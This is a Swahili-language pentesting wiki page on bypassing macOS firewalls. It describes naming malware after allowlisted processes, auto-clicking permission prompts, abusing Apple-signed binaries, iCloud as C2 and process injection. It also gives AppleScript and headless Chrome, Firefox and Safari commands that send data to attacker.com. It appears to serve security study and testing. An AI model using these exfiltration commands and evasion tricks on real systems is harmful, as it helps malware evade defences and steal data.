# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewall za macOS.

### Kutumia majina ya orodha ya ruhusa

- Kwa mfano, kuita malware kwa majina ya michakato maarufu ya macOS kama **`launchd`**

### Kibonyezi bandia

- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze ruhusa**

### **Tumia binaries zilizotiwa saini na Apple**

- Kama **`curl`**, lakini pia wengine kama **`whois`**

### Tovuti maarufu za apple

Firewall inaweza kuwa inaruhusu muunganisho kwa tovuti maarufu za apple kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Kupanua kwa ujumla

Wazo kadhaa za kujaribu kupita firewalls

### Angalia trafiki inayoruhusiwa

Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti zinazoweza kuwa kwenye orodha ya ruhusa au programu zipi zimepewa ruhusa kuziaccess.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS

Marekebisho ya DNS yanafanywa kupitia **`mdnsreponder`** programu iliyosainiwa ambayo labda itaruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia programu za kivinjari

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia sindano za mchakato

Ikiwa unaweza **kushinikiza msimbo katika mchakato** ambao unaruhusiwa kuungana na seva yoyote unaweza kupita ulinzi wa firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Marejeo

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
